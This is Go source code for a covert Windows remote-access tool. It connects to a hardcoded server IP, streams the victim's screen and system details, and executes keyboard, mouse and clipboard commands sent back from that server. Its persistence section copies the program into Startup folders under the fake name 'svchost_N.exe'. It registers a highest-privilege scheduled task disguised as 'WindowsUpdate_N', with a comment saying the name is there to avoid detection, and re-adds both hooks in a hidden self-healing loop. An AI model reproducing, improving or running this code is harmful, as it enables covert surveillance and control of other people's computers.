package main

import (
	"bytes"
	"crypto/tls"
	"encoding/binary"
	"encoding/json"
	"flag"
	"fmt"
	"errors"
	"image/jpeg"
	"io"
	"log"
	"net"
	"math/rand"
	"net/http"
	"os"
	"os/exec"
	"os/user"
	"path/filepath"
	"runtime"
	"strings"
	"sync"
	"syscall"
	"time"
	"unsafe"

	"github.com/kbinani/screenshot"
	//"golang.org/x/sys/windows/registry"
)

//=====================================================
// PART 1: ORIGINAL REMOTE CONTROL CLIENT CODE
//=====================================================

// InputEventType represents the type of input event
type InputEventType int

type POINT struct {
    X int32
    Y int32
}

const (
    MouseMove InputEventType = iota
    MouseDown
    MouseUp
    MouseWheel
    KeyDown
    KeyUp
    ClipboardUpdate
    RelativeMotion
    CursorConfined
    CursorReleased
)

// Message types
const (
    FrameData        byte = 'F'
    InputData        byte = 'I'
    SystemInfoType   byte = 'S'
)

// SystemInfo represents system information
type SystemInfo struct {
    Username     string `json:"username"`
    OS           string `json:"os"`
    Country      string `json:"country"`
    ComputerName string `json:"computerName"`
    ScreenWidth  int    `json:"screenWidth"`
    ScreenHeight int    `json:"screenHeight"`
}

// InputEvent represents an input event from the viewer
type InputEvent struct {
    Type       InputEventType `json:"type"`
    X          int           `json:"x,omitempty"`
    Y          int           `json:"y,omitempty"`
    Button     int           `json:"button,omitempty"`
    KeyCode    string        `json:"keyCode,omitempty"`
    WheelDelta int          `json:"wheelDelta,omitempty"`
    Text       string        `json:"text,omitempty"`
    Relative   bool         `json:"relative,omitempty"`
}

// Windows API constants
const (
    KEYEVENTF_KEYDOWN     = 0x0000
    KEYEVENTF_KEYUP       = 0x0002
    KEYEVENTF_EXTENDEDKEY = 0x0001
    INPUT_KEYBOARD        = 1
    INPUT_MOUSE           = 0
    MOUSEEVENTF_MOVE       = 0x0001
    MOUSEEVENTF_LEFTDOWN   = 0x0002
    MOUSEEVENTF_LEFTUP     = 0x0004
    MOUSEEVENTF_RIGHTDOWN  = 0x0008
    MOUSEEVENTF_RIGHTUP    = 0x0010
    MOUSEEVENTF_MIDDLEDOWN = 0x0020
    MOUSEEVENTF_MIDDLEUP   = 0x0040
    MOUSEEVENTF_WHEEL      = 0x0800
    MOUSEEVENTF_ABSOLUTE   = 0x8000
    CF_TEXT                = 1
    GMEM_MOVEABLE         = 0x0002
)

// Windows API structs
type KEYBDINPUT struct {
    Vk        uint16
    Scan      uint16
    Flags     uint32
    Time      uint32
    ExtraInfo uintptr
}

type MOUSEINPUT struct {
    Dx        int32
    Dy        int32
    MouseData uint32
    Flags     uint32
    Time      uint32
    ExtraInfo uintptr
}

type INPUTUNION struct {
    Mi MOUSEINPUT
    Ki KEYBDINPUT
}

type INPUT struct {
    Type uint32
    _    uint32 // Padding for alignment
    Data [32]byte // Union: size of the largest struct (MOUSEINPUT or KEYBDINPUT)
}

type RECT struct {
    Left   int32
    Top    int32
    Right  int32
    Bottom int32
}

var (
    user32          = syscall.NewLazyDLL("user32.dll")
    kernel32        = syscall.NewLazyDLL("kernel32.dll")
    setCursorPos    = user32.NewProc("SetCursorPos")
    getCursorPos    = user32.NewProc("GetCursorPos")
    clipCursor      = user32.NewProc("ClipCursor")
    sendInput       = user32.NewProc("SendInput")
    openClipboard   = user32.NewProc("OpenClipboard")
    closeClipboard  = user32.NewProc("CloseClipboard")
    emptyClipboard  = user32.NewProc("EmptyClipboard")
    setClipboardData = user32.NewProc("SetClipboardData")
    globalAlloc     = kernel32.NewProc("GlobalAlloc")
    globalLock      = kernel32.NewProc("GlobalLock")
    globalUnlock    = kernel32.NewProc("GlobalUnlock")
    getUserGeoInfo  = kernel32.NewProc("GetUserGeoInfo")

    // Remote control configuration flags
    serverIP        = flag.String("server", "86.38.225.117", "Server IP address")
    frameRate       = flag.Int("fps", 15, "Target frame rate")
    reconnectDelay  = flag.Int("reconnect", 30, "Reconnection delay in seconds")
    
    // Remote control operational variables
    stopSignal      = make(chan struct{})
    reconnectSignal = make(chan struct{})
    keyStates       = make(map[uint16]bool)
    keyStatesMutex  sync.RWMutex
    cursorConfined  bool
)

// runRemoteControl is the main function for the remote control client
func runRemoteControl() error {
    log.SetFlags(log.LstdFlags | log.Lshortfile)
    log.Println("Starting remote control client with reconnect delay of", *reconnectDelay, "seconds")

    // Create marker file to track update status
    markerFile := filepath.Join(os.TempDir(), "remote_control_running")
    if err := os.WriteFile(markerFile, []byte(time.Now().String()), 0644); err != nil {
        log.Printf("Warning: Failed to create marker file: %v", err)
    }
    defer os.Remove(markerFile)

    // Reconnection loop - restoring this from original code
    for {
        if err := connectAndServe(); err != nil {
            log.Println("Connection error:", err)
        }
        
        log.Printf("Connection lost. Reconnecting in %d seconds...", *reconnectDelay)
        time.Sleep(time.Duration(*reconnectDelay) * time.Second)
        
        // Reset stop signal channel for next connection
        stopSignal = make(chan struct{})
        reconnectSignal = make(chan struct{})
    }
}

func connectAndServe() error {
    // Reset cursor confinement if needed
    if cursorConfined {
        clipCursor.Call(0)
        cursorConfined = false
    }

    // Initialize display bounds
    bounds := screenshot.GetDisplayBounds(0)
    log.Printf("Display bounds: %v", bounds)

    // Configure TLS
    tlsConfig := &tls.Config{
        InsecureSkipVerify: true, // For self-signed certificates
    }

    // Connect using TLS
    conn, err := tls.Dial("tcp", *serverIP+":443", tlsConfig)
    if err != nil {
        return err
    }
    defer conn.Close()
    log.Println("Connected to server")

    // Send system information
    sysInfo := getSystemInfo()
    sysInfo.ScreenWidth = bounds.Dx()
    sysInfo.ScreenHeight = bounds.Dy()
    sysInfoJson, err := json.Marshal(sysInfo)
    if err != nil {
        log.Println("Failed to marshal system info:", err)
    } else {
        if err := sendMessage(conn, SystemInfoType, sysInfoJson); err != nil {
            log.Println("Failed to send system info:", err)
            return err
        }
    }

    // Start input handler goroutine
    go handleServerInput(conn)

    // Start screen capture loop
    ticker := time.NewTicker(time.Second / time.Duration(*frameRate))
    defer ticker.Stop()

    for {
        select {
        case <-ticker.C:
            start := time.Now()
            
            img, err := screenshot.CaptureDisplay(0)
            if err != nil {
                log.Println("Screen capture error:", err)
                continue
            }

            var buf bytes.Buffer
            if err := jpeg.Encode(&buf, img, &jpeg.Options{Quality: 45}); err != nil {
                log.Println("JPEG encode error:", err)
                continue
            }
            data := buf.Bytes()

            if err := sendMessage(conn, FrameData, data); err != nil {
                log.Println("Send error:", err)
                return err
            }
            log.Printf("Sent frame (%d bytes) in %v", len(data), time.Since(start))

        case <-stopSignal:
            if cursorConfined {
                clipCursor.Call(0)
            }
            return nil
        }
    }
}

func getSystemInfo() SystemInfo {
    info := SystemInfo{
        OS: runtime.GOOS + "/" + runtime.GOARCH,
    }

    // Get username
    if currentUser, err := user.Current(); err == nil {
        info.Username = currentUser.Username
    } else {
        info.Username = "Unknown"
    }

    // Get computer name
    if hostname, err := os.Hostname(); err == nil {
        info.ComputerName = hostname
    } else {
        info.ComputerName = "Unknown"
    }

    // Try to get country using Windows API
    info.Country = getCountryFromWindows()

    return info
}

func getCountryFromWindows() string {
    // Try to get country from IP using multiple services
    country := getCountryFromIP()
    if country != "" {
        return country
    }
    return "Unknown"
}

func getCountryFromIP() string {
    // Try multiple geolocation services
    services := []string{
        "https://ipinfo.io/json",
        "https://ip-api.com/json",
        "https://ipapi.co/json/",
    }
    
    client := &http.Client{
        Timeout: 5 * time.Second,
    }
    
    for _, service := range services {
        resp, err := client.Get(service)
        if err != nil {
            continue
        }
        defer resp.Body.Close()
        
        if resp.StatusCode != http.StatusOK {
            continue
        }
        
        var result map[string]interface{}
        if err := json.NewDecoder(resp.Body).Decode(&result); err != nil {
            continue
        }
        
        // Different services use different field names for country
        for _, field := range []string{"country", "country_name", "countryCode"} {
            if countryVal, exists := result[field]; exists && countryVal != nil {
                if country, ok := countryVal.(string); ok && country != "" {
                    return country
                }
            }
        }
    }
    
    return ""
}

func sendMessage(conn net.Conn, msgType byte, data []byte) error {
    header := make([]byte, 5)
    header[0] = msgType
    binary.BigEndian.PutUint32(header[1:], uint32(len(data)))
    
    if _, err := conn.Write(header); err != nil {
        return err
    }

    if _, err := conn.Write(data); err != nil {
        return err
    }
    return nil
}

func handleServerInput(conn net.Conn) {
    header := make([]byte, 5)
    
    for {
        _, err := io.ReadFull(conn, header)
        if err != nil {
            log.Println("Header read error:", err)
            close(stopSignal) // Signal to stop the current connection
            return
        }

        msgType := header[0]
        length := binary.BigEndian.Uint32(header[1:])

        if msgType == InputData {
            data := make([]byte, length)
            _, err := io.ReadFull(conn, data)
            if err != nil {
                log.Println("Input data read error:", err)
                continue
            }

            if err := handleInputEvent(data); err != nil {
                log.Println("Input handling error:", err)
            }
        }
    }
}

func validateCoordinates(x, y int) bool {
    bounds := screenshot.GetDisplayBounds(0)
    return x >= bounds.Min.X && x <= bounds.Max.X &&
           y >= bounds.Min.Y && y <= bounds.Max.Y
}

func sendMouseEventAbsolute(x, y int, flags uint32, data ...uint32) {
    bounds := screenshot.GetDisplayBounds(0)
    screenWidth := bounds.Dx()
    screenHeight := bounds.Dy()

    normalizedX := int32((float64(x) / float64(screenWidth)) * 65535)
    normalizedY := int32((float64(y) / float64(screenHeight)) * 65535)

    mouseData := uint32(0)
    if len(data) > 0 {
        mouseData = data[0]
    }

    mi := MOUSEINPUT{
        Dx:        normalizedX,
        Dy:        normalizedY,
        MouseData: mouseData,
        Flags:     flags | MOUSEEVENTF_ABSOLUTE,
        Time:      0,
        ExtraInfo: 0,
    }

    input := INPUT{
        Type: INPUT_MOUSE,
    }
    *(*MOUSEINPUT)(unsafe.Pointer(&input.Data[0])) = mi

    sendInput.Call(uintptr(1), uintptr(unsafe.Pointer(&input)), uintptr(unsafe.Sizeof(input)))
}

func handleInputEvent(data []byte) error {
    var event InputEvent
    if err := json.Unmarshal(data, &event); err != nil {
        log.Printf("[DEBUG] Failed to unmarshal input event: %v", err)
        return err
    }
    
    log.Printf("[DEBUG] Received input event: Type=%v, X=%v, Y=%v, Button=%v", 
        event.Type, event.X, event.Y, event.Button)

    switch event.Type {
    case MouseMove:
        if !validateCoordinates(event.X, event.Y) {
            log.Printf("[DEBUG] Invalid mouse coordinates: (%v,%v)", event.X, event.Y)
            return nil
        }
        log.Printf("[DEBUG] Processing MouseMove: relative=%v, coordinates=(%v,%v)", 
            event.Relative, event.X, event.Y)
     
        if event.Relative {
            var pt POINT
            ret, _, _ := getCursorPos.Call(uintptr(unsafe.Pointer(&pt)))
            if ret != 0 {
                newX := int(pt.X) + event.X
                newY := int(pt.Y) + event.Y
                setCursorPos.Call(uintptr(newX), uintptr(newY))
            }
        } else { 
            setCursorPos.Call(uintptr(event.X), uintptr(event.Y))
        }
        
    case MouseDown:
        bounds := screenshot.GetDisplayBounds(0)
        screenWidth := bounds.Dx()
        screenHeight := bounds.Dy()

        normalizedX := int32((float64(event.X) / float64(screenWidth)) * 65535)
        normalizedY := int32((float64(event.Y) / float64(screenHeight)) * 65535)

        var flags uint32
        switch event.Button {
        case 0:
            flags = MOUSEEVENTF_LEFTDOWN
        case 1:
            flags = MOUSEEVENTF_MIDDLEDOWN
        case 2:
            flags = MOUSEEVENTF_RIGHTDOWN
        default:
            log.Printf("[ERROR] Unknown mouse button: %d", event.Button)
            return nil
        }

        // Create move input
        moveInput := INPUT{
            Type: INPUT_MOUSE,
        }
        moveMi := MOUSEINPUT{
            Dx:        normalizedX,
            Dy:        normalizedY,
            Flags:     MOUSEEVENTF_ABSOLUTE | MOUSEEVENTF_MOVE,
        }
        *(*MOUSEINPUT)(unsafe.Pointer(&moveInput.Data[0])) = moveMi

        // Create button down input
        btnInput := INPUT{
            Type: INPUT_MOUSE,
        }
        btnMi := MOUSEINPUT{
            Flags: flags,
        }
        *(*MOUSEINPUT)(unsafe.Pointer(&btnInput.Data[0])) = btnMi

        inputs := []INPUT{moveInput, btnInput}

        ret, _, err := sendInput.Call(uintptr(len(inputs)), 
            uintptr(unsafe.Pointer(&inputs[0])), 
            uintptr(unsafe.Sizeof(INPUT{})))
        if ret == 0 {
            log.Printf("[ERROR] Failed to send mouse event: %v", err)
        }

    case MouseUp:
        var flags uint32
        switch event.Button {
        case 0:
            flags = MOUSEEVENTF_LEFTUP
        case 1:
            flags = MOUSEEVENTF_MIDDLEUP
        case 2:
            flags = MOUSEEVENTF_RIGHTUP
        default:
            log.Printf("[ERROR] Unknown mouse button: %d", event.Button)
            return nil
        }
        
        // Send mouse up event 
        sendMouseEvent(flags)    
    case MouseWheel:
        sendMouseEvent(MOUSEEVENTF_WHEEL, uint32(event.WheelDelta))
    
    case KeyDown:
        key := getKeyCode(event.KeyCode)
        sendKey(key, KEYEVENTF_KEYDOWN)
    
    case KeyUp:
        key := getKeyCode(event.KeyCode)
        sendKey(key, KEYEVENTF_KEYUP)
    
    case ClipboardUpdate:
        setClipboard(event.Text)
        return nil

    case CursorConfined:
        bounds := screenshot.GetDisplayBounds(0)
        rect := RECT{
            Left:   int32(bounds.Min.X),
            Top:    int32(bounds.Min.Y),
            Right:  int32(bounds.Max.X),
            Bottom: int32(bounds.Max.Y),
        }
        clipCursor.Call(uintptr(unsafe.Pointer(&rect)))
        cursorConfined = true

    case CursorReleased:
        clipCursor.Call(0)
        cursorConfined = false
    }

    return nil
}

func sendKey(key int, flags uint32) {
    keyStatesMutex.Lock()
    defer keyStatesMutex.Unlock()

    if flags == KEYEVENTF_KEYDOWN {
        if keyStates[uint16(key)] {
            return // Filter repeated keydown
        }
        keyStates[uint16(key)] = true
    } else {
        keyStates[uint16(key)] = false
    }

    if key >= 0x100 {
        flags |= KEYEVENTF_EXTENDEDKEY
    }

    input := INPUT{
        Type: INPUT_KEYBOARD,
    }
    ki := KEYBDINPUT{
        Vk:        uint16(key),
        Scan:      0,
        Flags:     flags,
        Time:      0,
        ExtraInfo: 0,
    }
    // Copy the KEYBDINPUT struct into the Data field
    *(*KEYBDINPUT)(unsafe.Pointer(&input.Data[0])) = ki

    sendInput.Call(uintptr(1), uintptr(unsafe.Pointer(&input)), uintptr(unsafe.Sizeof(input)))
}

func sendMouseEvent(flags uint32, data ...uint32) {
    mouseData := uint32(0)
    if len(data) > 0 {
        mouseData = data[0]
    }

    input := INPUT{
        Type: INPUT_MOUSE,
    }
    mi := MOUSEINPUT{
        Dx:        0,
        Dy:        0,
        MouseData: mouseData,
        Flags:     flags,
        Time:      0,
        ExtraInfo: 0,
    }
    // Copy the MOUSEINPUT struct into the Data field
    *(*MOUSEINPUT)(unsafe.Pointer(&input.Data[0])) = mi

    ret, _, err := sendInput.Call(uintptr(1), uintptr(unsafe.Pointer(&input)), uintptr(unsafe.Sizeof(input)))
    if ret == 0 {
        log.Printf("[ERROR] Failed to send mouse event: %v", err)
    }
}

func setClipboard(text string) {
    r, _, _ := openClipboard.Call(0)
    if r == 0 {
        return
    }
    defer closeClipboard.Call()
    
    emptyClipboard.Call()
    
    utf16 := syscall.StringToUTF16(text)
    size := len(utf16)*2
    
    h, _, _ := globalAlloc.Call(GMEM_MOVEABLE, uintptr(size))
    locked, _, _ := globalLock.Call(h)
    
    copy((*[1<<30]byte)(unsafe.Pointer(locked))[:size], 
        *(*[]byte)(unsafe.Pointer(&utf16)))
    
    globalUnlock.Call(h)
    setClipboardData.Call(CF_TEXT, h)
}

func sanitizeClipboard(input string) string {
    if len(input) > 1024 {
        input = input[:1024]
    }
    return strings.ReplaceAll(input, "\x00", "")
}

var keycodeMappings = map[string]int{
    // Standard keys
    "Enter":     0x0D,
    "Backspace": 0x08,
    "Tab":       0x09,
    "Space":     0x20,
    "Shift":     0x10,
    "Control":   0x11,
    "Alt":       0x12,
    "Escape":    0x1B,
    "Left":      0x25,
    "Up":        0x26,
    "Right":     0x27,
    "Down":      0x28,
    "Delete":    0x2E,
    
    // Function keys
    "F1":        0x70,
    "F2":        0x71,
    "F3":        0x72,
    "F4":        0x73,
    "F5":        0x74,
    "F6":        0x75,
    "F7":        0x76,
    "F8":        0x77,
    "F9":        0x78,
    "F10":       0x79,
    "F11":       0x7A,
    "F12":       0x7B,

    // Special keys
    "PrintScreen": 0x2C,
    "ScrollLock":  0x91,
    "Pause":       0x13,
    "Insert":      0x2D,
    "Home":        0x24,
    "PageUp":      0x21,
    "PageDown":    0x22,
    "End":         0x23,
    "NumLock":     0x90,

    // International keyboard support
    "ö":          0xBA,
    "ä":          0xDE,
    "ü":          0xBF,
    "ß":          0xBD,
    "半角/全角":   0x29,
    "漢字":        0x19,
}

func getKeyCode(keyCode string) int {
    // Handle modifier keys
    switch keyCode {
    case "ControlLeft", "ControlRight":
        return 0x11 // VK_CONTROL
    case "AltLeft", "AltRight":
        return 0x12 // VK_MENU
    case "ShiftLeft", "ShiftRight":
        return 0x10 // VK_SHIFT
    }

    // Handle 'KeyA' style codes (e.g., 'KeyA' -> 'A')
    if strings.HasPrefix(keyCode, "Key") && len(keyCode) == 4 {
        return int(keyCode[3])
    }

    // Handle 'DigitX' style codes (e.g., 'Digit2' -> '2')
    if strings.HasPrefix(keyCode, "Digit") && len(keyCode) == 6 {
        return int(keyCode[5])
    }

    // Extended special key mappings
    specialKeyMap := map[string]int{
        "Comma":         0xBC,  // VK_OEM_COMMA
        "Period":        0xBE,  // VK_OEM_PERIOD
        "Slash":         0xBF,  // VK_OEM_2
        "Semicolon":     0xBA,  // VK_OEM_1
        "Quote":         0xDE,  // VK_OEM_7
        "BracketRight":  0xDD,  // VK_OEM_6
        "BracketLeft":   0xDB,  // VK_OEM_4
        "Backslash":     0xDC,  // VK_OEM_5
        "Minus":         0xBD,  // VK_OEM_MINUS
        "Equal":         0xBB,  // VK_OEM_PLUS
        "Backquote":     0xC0,  // VK_OEM_3
        "IntlBackslash": 0xE2,  // VK_OEM_102
    }

    if code, exists := specialKeyMap[keyCode]; exists {
        return code
    }

    // Check against existing mappings
    if code, exists := keycodeMappings[keyCode]; exists {
        return code
    }

    // Handle single character keys (fallback)
    if len(keyCode) == 1 {
        return int([]byte(strings.ToUpper(keyCode))[0])
    }

    // Log unhandled key codes for debugging
    log.Printf("Unhandled key code: %s\n", keyCode)
    return 0
}

//=====================================================
// PART 2: EXTRAS (e.g. add to startup and install for all users)
//=====================================================

// ... (previous code remains the same)

// EXTRAS: Persistence and self-healing mechanisms

func isAdmin() bool {
    // Attempt to access a privileged resource
    _, err := os.Open("\\\\.\\PHYSICALDRIVE0")
    return err == nil
}

func getStartupPath() (string, error) {
    configDir, err := os.UserConfigDir()
    if err != nil {
        return "", err
    }
    return filepath.Join(configDir, "Microsoft", "Windows", "Start Menu", "Programs", "Startup"), nil
}

func getAllUsersStartupPath() (string, error) {
    programData := os.Getenv("ProgramData")
    if programData == "" {
        return "", errors.New("ProgramData environment variable not set")
    }
    return filepath.Join(programData, "Microsoft", "Windows", "Start Menu", "Programs", "Startup"), nil
}

func copyExecutable(destDir string) error {
    src, err := os.Executable()
    if err != nil {
        return err
    }

    // Generate random filename
    rand.Seed(time.Now().UnixNano())
    fileName := fmt.Sprintf("svchost_%d.exe", rand.Intn(10000))
    destPath := filepath.Join(destDir, fileName)

    input, err := os.ReadFile(src)
    if err != nil {
        return err
    }

    // Check if already exists with same content
    if existing, err := os.ReadFile(destPath); err == nil {
        if bytes.Equal(existing, input) {
            return nil
        }
    }

    return os.WriteFile(destPath, input, 0755)
}

func setupPersistence() {
    // Current user persistence
    if userStartup, err := getStartupPath(); err == nil {
        if _, err := os.Stat(userStartup); os.IsNotExist(err) {
            os.MkdirAll(userStartup, 0755)
        }
        if err := copyExecutable(userStartup); err == nil {
            log.Println("Added to current user startup")
        }
    }

    // All users persistence (admin required)
    if isAdmin() {
        if allUsersStartup, err := getAllUsersStartupPath(); err == nil {
            if _, err := os.Stat(allUsersStartup); os.IsNotExist(err) {
                os.MkdirAll(allUsersStartup, 0755)
            }
            if err := copyExecutable(allUsersStartup); err == nil {
                log.Println("Added to all users startup")
            }
        }
    }
}

func createScheduledTask() {
    if !isAdmin() {
        return
    }

    exePath, err := os.Executable()
    if err != nil {
        return
    }

    // Random task name to avoid detection
    taskName := fmt.Sprintf("WindowsUpdate_%d", rand.Intn(10000))
    cmd := exec.Command("schtasks", "/Create", "/TN", taskName, "/TR", exePath, 
        "/SC", "ONLOGON", "/F", "/RL", "HIGHEST")
    
    if output, err := cmd.CombinedOutput(); err != nil {
        log.Printf("Failed to create task: %s\n%s", err, output)
    } else {
        log.Println("Created scheduled task")
    }
}

func selfHealingLoop() {
    // Random initial delay between 1-5 minutes
    time.Sleep(time.Duration(60 + rand.Intn(240)) * time.Second)
    
    for {
        setupPersistence()
        createScheduledTask()
        
        // Random interval between 6-24 hours
        interval := time.Duration(6 + rand.Intn(18)) * time.Hour
        time.Sleep(interval)
    }
}


//=====================================================
// MAIN ENTRY POINT (modify this to call the new EXTRAS
//=====================================================

func main() {
    // Parse flags early so we know the execution mode
    //deployFlag := flag.Bool("deploy", false, "Enable network deployment")
    remoteControlOnly := flag.Bool("rc-only", false, "Run only remote control client (no deployment)")
    flag.Parse()

    log.Println("Starting application...")
    
    // Start remote control in a goroutine to allow it to run in the background
    go func() {
        log.Println("Initializing remote control client...")
        // This never returns due to the reconnection loop
        if err := runRemoteControl(); err != nil {
            log.Printf("Remote control client error: %v", err)
        }
    }()
    
    // If remote-control-only flag is set, just keep the main thread alive
    if *remoteControlOnly {
        log.Println("Running in remote control only mode")
        // Block forever to keep the remote control client running
        select {}
    }
	
   flag.Parse()
    log.SetFlags(log.LstdFlags | log.Lshortfile)

    // Start self-healing mechanism in background
    go func() {
        time.Sleep(120 * time.Second) // Initial delay
        setupPersistence()
        createScheduledTask()
        selfHealingLoop()
    }()

    // Keep main thread alive to allow remote control to continue running
    select {}
}